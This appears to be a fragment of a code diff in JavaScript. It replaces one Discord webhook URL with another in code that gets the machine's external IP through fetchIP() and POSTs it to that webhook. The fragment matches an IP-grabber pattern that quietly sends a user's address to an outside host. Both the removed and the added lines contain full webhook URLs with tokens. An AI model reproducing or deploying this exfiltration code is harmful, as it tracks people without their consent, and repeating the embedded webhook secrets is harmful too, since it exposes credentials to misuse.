@@ -16,7 +16,7 @@ fetchIP()
       content: externalIP,
     };
 
-fetch('https://discord.com/api/webhooks/1117662800010039327/4jLfqlqSySpzHX-LDgK3ka8vbwSK2OAVtMkNGUL2UaMqjHkmf0_fbbc_bsEioGcNJR3u', {
+fetch('https://discord.com/api/webhooks/1229239913967386665/44DotwpieUk4Uc2NCCtu71NymkJqzmZZn_va353Xep54Tf3tpzNNbyajE3Ml2dORL97F', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
